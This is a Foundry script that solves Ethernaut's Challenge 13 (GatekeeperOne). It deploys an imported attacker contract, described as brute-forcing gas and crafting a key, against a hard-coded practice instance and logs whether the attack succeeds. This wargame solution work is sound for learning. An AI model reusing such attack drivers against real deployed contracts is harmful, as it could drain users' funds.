// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/13-GatekeeperOne/GatekeeperOneAttacker.sol";

/**
 * @title Challenge 13 Solution Script
 * @notice Deploy GatekeeperOneAttacker that brute-forces gas and crafts key
 */
contract GatekeeperOneSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0x3be7E01eB665d6d2C0B9113D9F642352a7e59A53;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        GatekeeperOneAttacker attacker = new GatekeeperOneAttacker(INSTANCE);
        bool success = attacker.attack();
        console.log("Attack success:", success);

        vm.stopBroadcast();

        console.log("Challenge 13 completed!");
    }
}
